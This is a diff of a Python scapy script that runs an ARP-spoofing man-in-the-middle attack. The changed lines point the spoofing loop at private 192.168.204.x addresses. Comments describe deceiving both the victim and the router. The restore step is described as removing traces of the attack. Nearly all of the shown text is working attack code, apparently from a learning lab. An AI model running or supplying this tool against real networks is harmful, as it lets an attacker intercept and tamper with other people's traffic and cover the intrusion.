@@ -24,7 +24,7 @@ def spoof(target_ip, spoof_ip):
 def restore(destination_ip, source_ip):
     destination_mac = getMac(destination_ip)
     source_mac = getMac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac) 
     #op=2 is for response
     #pdst=destination ip address
     #hwdst=destination mac address
@@ -35,14 +35,14 @@ def restore(destination_ip, source_ip):
 send_packets_count = 0
 try: # handling the error of control c
     while True:
-        spoof("192.168.1.132", "192.168.1.1")
-        spoof("192.168.1.1","192.168.1.132")
+        spoof("192.168.204.128", "192.168.204.2") # making the victim believe we are the router
+        spoof("192.168.204.2","192.168.204.128") # making the router beleive we are the victim.
         send_packets_count = send_packets_count + 2
         print("\r[+] Sent packets " + str(send_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please Wait.\n")
-    restore("192.168.1.10", "192.168.1.1")
+    restore("192.168.204.2", "192.168.204.128") # restoring the arp tables to remove traces of the man in the middle attack
     print("[+] ARP Table restored. Quitting...")
     
 
